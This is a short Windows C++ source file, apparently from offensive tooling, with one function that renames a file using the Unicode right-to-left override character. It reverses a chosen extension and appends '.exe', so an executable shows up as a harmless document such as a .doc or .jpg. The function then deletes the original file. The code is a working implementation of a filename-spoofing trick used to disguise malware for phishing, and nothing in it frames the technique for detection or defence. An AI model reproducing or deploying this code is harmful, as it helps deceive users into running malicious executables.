
#include "FakeFilename.h"
#include <shlwapi.h>


int FakeFilename::fakefn(string srcfn,string surfixname,string dstmainfn) {
	int ret = 0;

	char lpfn[MAX_PATH] = { 0 };
	lstrcpyA(lpfn, srcfn.c_str());
	PathStripPathA(lpfn);

	string mainname = dstmainfn;
// 	int pos = string(lpfn).find(".");
// 	if (pos >= 0)
// 	{
// 		mainname = string(lpfn).substr(0,pos);
// 	}

	char szcurdir[MAX_PATH];
	ret = GetCurrentDirectoryA(MAX_PATH, szcurdir);

	char sznewfn[MAX_PATH] = { 0 };
	lstrcpyA(sznewfn, szcurdir);
	lstrcatA(sznewfn, "\\");
	lstrcatA(sznewfn, mainname.c_str());

	wchar_t wsznewfn[1024] = { 0 };
	ret = MultiByteToWideChar(CP_ACP, 0, sznewfn, strlen(sznewfn), wsznewfn, 1024);
	int wszlen = lstrlenW(wsznewfn);
	wsznewfn[wszlen] = 0x202e;
	wszlen++;

	if (surfixname.at(0) == '.')
	{
		surfixname = surfixname.substr(1);
	}

	char szsurfix[MAX_PATH] = { 0 };
	for (int j = 0, i = surfixname.length() - 1; i >= 0; i--, j++)
	{
		szsurfix[j] = surfixname.at(i);
	}

	char szstrexe[] = { '.','e','x','e',0 };
	string surfix = string(szsurfix) + szstrexe;
	wchar_t wszsurfixname[1024] = { 0 };
	ret = MultiByteToWideChar(CP_ACP, 0, surfix.c_str(), surfix.length(), wszsurfixname, 1024);
	memmove(wsznewfn + wszlen, (char*)wszsurfixname, surfix.length() * 2);

	HANDLE hnf = CreateFileW(wsznewfn, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	HANDLE hof = CreateFileA(srcfn.c_str(), GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	int oldfilesize = GetFileSize(hof, 0);
	char * lpbuf = new char[oldfilesize + 1024];
	DWORD dwcnt = 0;
	ret = ReadFile(hof, lpbuf, oldfilesize, &dwcnt, 0);
	ret = WriteFile(hnf, lpbuf, oldfilesize, &dwcnt, 0);
	CloseHandle(hnf);
	CloseHandle(hof);

	DeleteFileA(srcfn.c_str());

	return 0;
}